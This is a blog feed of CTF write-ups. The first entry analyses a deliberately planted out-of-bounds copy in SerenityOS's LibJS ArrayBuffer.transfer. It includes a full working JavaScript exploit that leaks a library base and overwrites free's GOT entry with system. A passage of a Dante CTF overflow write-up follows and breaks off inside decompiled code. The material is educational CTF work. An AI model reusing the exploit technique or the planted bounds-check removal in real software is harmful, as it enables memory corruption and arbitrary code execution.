define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // define_native_accessor(</span></span><br><span class="line"><span class="addition">+    //     realm,</span></span><br><span class="line"><span class="addition">+    //     &quot;_&quot;,</span></span><br><span class="line"><span class="addition">+    //     [](JS::VM&amp;) &#123;</span></span><br><span class="line"><span class="addition">+    //         return g_last_value.value();</span></span><br><span class="line"><span class="addition">+    //     &#125;,</span></span><br><span class="line"><span class="addition">+    //     [](JS::VM&amp; vm) -&gt; JS::ThrowCompletionOr&lt;JS::Value&gt; &#123;</span></span><br><span class="line"><span class="addition">+    //         auto&amp; global_object = vm.get_global_object();</span></span><br><span class="line"><span class="addition">+    //         VERIFY(is&lt;ReplObject&gt;(global_object));</span></span><br><span class="line"><span class="addition">+    //         outln(&quot;Disable writing last value to &#x27;_&#x27;&quot;);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    //         // We must delete first otherwise this setter gets called recursively.</span></span><br><span class="line"><span class="addition">+    //         TRY(global_object.internal_delete(JS::PropertyKey &#123; &quot;_&quot; &#125;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    //         auto value = vm.argument(0);</span></span><br><span class="line"><span class="addition">+    //         TRY(global_object.internal_set(JS::PropertyKey &#123; &quot;_&quot; &#125;, value, &amp;global_object));</span></span><br><span class="line"><span class="addition">+    //         return value;</span></span><br><span class="line"><span class="addition">+    //     &#125;,</span></span><br><span class="line"><span class="addition">+    //     attr);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> JS_DEFINE_NATIVE_FUNCTION(ReplObject::save_to_file)</span><br><span class="line"><span class="meta">@@ -429,11 +429,11 @@</span> void ScriptObject::initialize(JS::Realm&amp; realm)</span><br><span class="line"> &#123;</span><br><span class="line">     Base::initialize(realm);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="deletion">-    u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="addition">+    // u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> JS_DEFINE_NATIVE_FUNCTION(ScriptObject::load_ini)</span><br></pre></td></tr></table></figure><p>I got errors when I applied it to my source using <code>git apply</code>. So I modified source codes myself.<br>By the way, when I checked it I knew this challenge is from <code>serenity</code>. </p><ul><li><a href="https://github.com/SerenityOS/serenity/tree/master">https://github.com/SerenityOS/serenity/tree/master</a></li></ul><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>The important part is <code>array_buffer_copy_and_detach</code> function in <code>ArrayBuffer.cpp</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 25.1.2.14 ArrayBufferCopyAndDetach ( arrayBuffer, newLength, preserveResizability ), https://tc39.es/proposal-arraybuffer-transfer/#sec-arraybuffer.prototype.transfertofixedlength</span></span><br><span class="line">ThrowCompletionOr&lt;ArrayBuffer*&gt; <span class="title function_">array_buffer_copy_and_detach</span><span class="params">(VM&amp; vm, ArrayBuffer&amp; array_buffer, Value new_length, PreserveResizability)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span>&amp; realm = *vm.current_realm();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. Perform ? RequireInternalSlot(arrayBuffer, [[ArrayBufferData]]).</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 2. If IsSharedArrayBuffer(arrayBuffer) is true, throw a TypeError exception.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. If newLength is undefined, then</span></span><br><span class="line">    <span class="comment">// a. Let newByteLength be arrayBuffer.[[ArrayBufferByteLength]].</span></span><br><span class="line">    <span class="comment">// 4. Else,</span></span><br><span class="line">    <span class="comment">// a. Let newByteLength be ? ToIndex(newLength).</span></span><br><span class="line">    <span class="keyword">auto</span> new_byte_length = new_length.is_undefined() ? array_buffer.byte_length() : TRY(new_length.to_index(vm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. If IsDetachedBuffer(arrayBuffer) is true, throw a TypeError exception.</span></span><br><span class="line">    <span class="keyword">if</span> (array_buffer.is_detached())</span><br><span class="line">        <span class="keyword">return</span> vm.throw_completion&lt;TypeError&gt;(ErrorType::DetachedArrayBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 6. If preserveResizability is preserve-resizability and IsResizableArrayBuffer(arrayBuffer) is true, then</span></span><br><span class="line">    <span class="comment">// a. Let newMaxByteLength be arrayBuffer.[[ArrayBufferMaxByteLength]].</span></span><br><span class="line">    <span class="comment">// 7. Else,</span></span><br><span class="line">    <span class="comment">// a. Let newMaxByteLength be empty.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. If arrayBuffer.[[ArrayBufferDetachKey]] is not undefined, throw a TypeError exception.</span></span><br><span class="line">    <span class="keyword">if</span> (!array_buffer.detach_key().is_undefined())</span><br><span class="line">        <span class="keyword">return</span> vm.throw_completion&lt;TypeError&gt;(ErrorType::DetachKeyMismatch, array_buffer.detach_key(), js_undefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. Let newBuffer be ? AllocateArrayBuffer(%ArrayBuffer%, newByteLength, <span class="doctag">FIXME:</span> newMaxByteLength).</span></span><br><span class="line">    <span class="keyword">auto</span>* new_buffer = TRY(allocate_array_buffer(vm, realm.intrinsics().array_buffer_constructor(), new_byte_length));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).</span></span><br><span class="line">    <span class="keyword">auto</span> copy_length = min(new_byte_length, array_buffer.byte_length());</span><br><span class="line">    <span class="keyword">if</span>(array_buffer.byte_length() &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">        copy_length = array_buffer.byte_length();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].</span></span><br><span class="line">    <span class="comment">// 12. Let toBlock be newBuffer.[[ArrayBufferData]].</span></span><br><span class="line">    <span class="comment">// 13. Perform CopyDataBlockBytes(toBlock, 0, fromBlock, 0, copyLength).</span></span><br><span class="line">    <span class="comment">// 14. <span class="doctag">NOTE:</span> Neither creation of the new Data Block nor copying from the old Data Block are observable. Implementations may implement this method as a zero-copy move or a realloc.</span></span><br><span class="line">    copy_data_block_bytes(new_buffer-&gt;buffer(), <span class="number">0</span>, array_buffer.buffer(), <span class="number">0</span>, copy_length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 15. Perform ! DetachArrayBuffer(arrayBuffer).</span></span><br><span class="line">    TRY(detach_array_buffer(vm, array_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 16. Return newBuffer.</span></span><br><span class="line">    <span class="keyword">return</span> new_buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I wanted to trigger this function, But I didn‚Äôt know how to trigger it. So I read mozilla‚Äôs document. The reason I read this part was simply because this function was related to arraybuffer. (guessing with file name ^^)</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer.prototype.transfer() Experimental</span><br><span class="line">Creates a new ArrayBuffer with the same byte content as this buffer, then detaches this buffer.</span><br></pre></td></tr></table></figure><p>I realized I could use <code>transfer</code>. I was able to trigger it using the script below.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer)</span><br><span class="line">buffer.<span class="title function_">transfer</span>(<span class="number">0x8</span>);</span><br></pre></td></tr></table></figure><p>The important point in this function is how define <code>copy_length</code>. When size of old buffer(<code>arrray_buffer</code>) is over 0x100, size of <code>new_buffer</code> is same as old buffer. It is really important that <code>copy_length</code> is newly redefined because the argument of <code>transfer</code> is passed to malloc as a size, which creates a new buffer. </p><p>In the JavaScript above is original <code>copy_length</code> is 0x20, but size of <code>array_buffer</code> is over 0x100, so it is redefined as 0x120!</p><p>Now let‚Äôs analyze the function below. (<code>copy_data_block_bytes</code>) </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6.2.9.3 CopyDataBlockBytes ( toBlock, toIndex, fromBlock, fromIndex, count ), https://tc39.es/ecma262/#sec-copydatablockbytes</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_data_block_bytes</span><span class="params">(ByteBuffer&amp; to_block, u64 to_index, ByteBuffer <span class="type">const</span>&amp; from_block, u64 from_index, u64 count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. Assert: fromBlock and toBlock are distinct values.</span></span><br><span class="line">    VERIFY(&amp;to_block != &amp;from_block);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Let fromSize be the number of bytes in fromBlock.</span></span><br><span class="line">    <span class="keyword">auto</span> from_size = from_block.size();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. Assert: fromIndex + count ‚â§ fromSize.</span></span><br><span class="line">    VERIFY(from_index + count &lt;= from_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. Let toSize be the number of bytes in toBlock.</span></span><br><span class="line">    <span class="comment">// auto to_size = to_block.size();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. Assert: toIndex + count ‚â§ toSize.</span></span><br><span class="line">    <span class="comment">// VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. Repeat, while count &gt; 0,</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ii. Set toBlock[toIndex] to fromBlock[fromIndex].</span></span><br><span class="line">        to_block[to_index] = from_block[from_index]; <span class="comment">// here!!!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// c. Set toIndex to toIndex + 1.</span></span><br><span class="line">        ++to_index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// d. Set fromIndex to fromIndex + 1.</span></span><br><span class="line">        ++from_index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// e. Set count to count - 1.</span></span><br><span class="line">        --count;</span><br><span class="line">        <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. Return unused.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is no <code>to_index + count &lt;= to_size</code> check. So I can trigger overflow in this line.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ii. Set toBlock[toIndex] to fromBlock[fromIndex].</span></span><br><span class="line">to_block[to_index] = from_block[from_index]; <span class="comment">// here!!!</span></span><br></pre></td></tr></table></figure><p>It was natural, since length(size) of <code>to_block</code> is smaller than <code>count</code>. </p><p>This is the end of the vulnerabilities I analyzed. Now Let‚Äôs go exploit. ^^</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><p>libc leak</p><ul><li>I leaked address of <code>liblagom-js.so.0</code>.</li><li>During this process, I conducted various experiments. </li><li>I knew the return value of <code>transfer</code> can made type array. So I tried it and then I can did it. (Actually I think I was lucky. ^^)</li><li>However, in this process, it was necessary to set values such as view[4], view[5], and view[6]. I relied on dynamic analysis(gdb). </li><li><code>view[4]</code>: it means size of victim. when this had too low value, I can‚Äôt made type array.</li><li><code>view[5]</code>: whether it is an inline buffer. (I didn‚Äôt know what this meant when I solved.)</li><li><code>view[6]</code>: whether it is detached.</li></ul></li><li><p>GOT overwriting</p><ul><li>I checked the mapping memory(vmmap instruction in gef debugger) to see if this was possible or not.</li><li>When I called <code>transer</code>, I checked the <code>free</code> is called. To be exact, it is called when the old buffer is detached. (<code>detach_array_buffer</code>)</li><li>So I decided to overwrite free‚Äôs got with a system function!</li><li>Actually, I had concerns about how to give an argument to the system.</li><li>The answer was to write to an Array Buffer.</li><li>In this challenge, I need to execute <code>/readflag</code> instead of <code>sh</code> to read flag.</li></ul></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`-<span class="subst">$&#123;hex(-x)&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`0x<span class="subst">$&#123;x.toString(<span class="number">16</span>)&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    view = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line">     </span><br><span class="line">    view[<span class="number">4</span>] = <span class="number">0x500n</span>; <span class="comment">// size</span></span><br><span class="line">    view[<span class="number">5</span>] = <span class="number">1n</span>;     <span class="comment">// from_block = (__int64 *)*a3;</span></span><br><span class="line">    view[<span class="number">6</span>] = <span class="number">1n</span>;     <span class="comment">// is_detached</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> buffer2 = buffer.<span class="title function_">transfer</span>(<span class="number">0x20</span>); </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(buffer2.<span class="property">byteLength</span>);</span><br><span class="line">    <span class="keyword">var</span> victim = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        leak</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    liblagom_js_base = victim[<span class="number">8</span>] - <span class="number">0x67dda8n</span>; <span class="comment">// liblagom-js.so.0</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;liblagom_js_base: &quot;</span> + <span class="title function_">hex</span>(liblagom_js_base));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Exploit setup</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    hax = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line">    free_got = liblagom_js_base + <span class="number">0x69b420n</span>;</span><br><span class="line">    system = liblagom_js_base - <span class="number">0x5c4dd0n</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;free_got: &quot;</span>+ <span class="title function_">hex</span>(free_got));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;system: &quot;</span>+ <span class="title function_">hex</span>(system));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    v = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(b);</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">0x616c66646165722fn</span>; </span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">0x0000000000000067n</span>;</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">4</span>] = <span class="number">0x500n</span>; <span class="comment">// size</span></span><br><span class="line">    v[<span class="number">5</span>] = <span class="number">1n</span>;     <span class="comment">// from_block = (__int64 *)*a3;</span></span><br><span class="line">    v[<span class="number">6</span>] = <span class="number">1n</span>;     <span class="comment">// is_detached</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// got overwriting</span></span><br><span class="line">    victim[<span class="number">64</span>] = free_got; </span><br><span class="line">    hax[<span class="number">0</span>] = system;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Exploit</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    b.<span class="title function_">transfer</span>(<span class="number">0x20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">pwn</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> javascript-engine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dante CTF 2023 - Dantes Notebook (overflow)</title>
      <link href="/230609-dantectf2023-dantes_notebook/"/>
      <url>/230609-dantectf2023-dantes_notebook/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2000">https://ctftime.org/event/2000</a></li></ul><blockquote><p>During his trip to Hell Dante met many souls. He took notes about them in this diary.<br>Author: lillo<br>Medium<br><code>challs.dantectf.it:31530/tcp</code></p></blockquote><ul><li>[29 solves &#x2F; 435 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>heap Î¨∏Ï†úÏù∏ Ï§Ñ ÏïåÏïòÏúºÎÇò ÏïÑÎãàÏóàÎã§. Î∂ÑÏÑùÌïú Í≤∞Í≥º, Í∞ÑÎã®Ìïú fsbÍ∞Ä ÌÑ∞ÏßÄÍ≥†, overflowÎÇòÎäî Í≥≥Ïù¥ Îëê Í≥≥ ÏûàÎã§. ÌïòÏßÄÎßå Ìïú Í≥≥Îßå ÌùêÎ¶ÑÏùÑ Ï°∞Ïûë Í∞ÄÎä•ÌïòÎã§. overflowÎ°ú ÌùêÎ¶ÑÏùÑ Ï°∞ÏûëÌï† Îïå, canaryÍ∞Ä Ï°¥Ïû¨ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê fsbÎ°ú canaryÎ•º leakÌïòÍ∏∞Î°ú ÌñàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Souls</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="type">char</span> date[<span class="number">11</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_soul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Souls</span> *<span class="title">dest</span>;</span> <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *src = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Notebook position [1-5]: &quot;</span>);</span><br><span class="line">  idx = read_int() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( souls[idx] )                           </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid slot!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = <span class="built_in">malloc</span>(<span class="number">68uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!\n&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Soul name: &quot;</span>);</span><br><span class="line">      read_string(src, <span class="number">0x20</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( src[<span class="number">0</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(dest-&gt;name, src, <span class="number">0x20</span>uLL);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Circle where I found him/her [1-9]: &quot;</span>);</span><br><span class="line">        v2 = read_int();</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          dest-&gt;num = v2;</span><br><span class="line">          <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;When I met him/her [dd/Mon/YYYY]: &quot;</span>);</span><br><span class="line">          read_string(src, <span class="number">0x60</span>uLL);            <span class="comment">// bof</span></span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(src) != <span class="number">11</span> &amp;&amp; !sanitize_date(src) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid date!\n&quot;</span>);</span><br><span class="line">            _exit(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">strncpy</span>(dest-&gt;date, src, <span class="number">12uLL</span>);</span><br><span class="line">          souls[idx] = dest;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Soul registered!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid circle!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid 